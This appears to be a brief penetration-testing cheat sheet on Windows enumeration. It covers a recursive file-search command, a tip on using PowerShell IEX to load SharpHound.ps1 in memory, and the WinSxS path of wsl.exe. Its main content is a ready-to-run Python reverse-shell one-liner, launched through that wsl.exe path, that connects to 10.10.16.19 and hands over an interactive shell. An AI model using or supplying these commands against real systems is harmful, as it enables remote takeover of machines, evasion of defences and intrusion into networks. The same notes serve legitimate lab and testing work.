# Windows Enumeration


| Command | Summary |
| --------- | ---------------------------- |
| ```dir <name of file> /s /p``` | Search the file system, recursively for the filename |

| Check | Description |
| --------- | ---------------------------- |
| PowerShell IWR vs IEX | Be sure to remember IEX will run the script in memory, useful for loading SharpHound.ps1 remotely |

## Common Location for WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

## Python Reverse Shell with WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```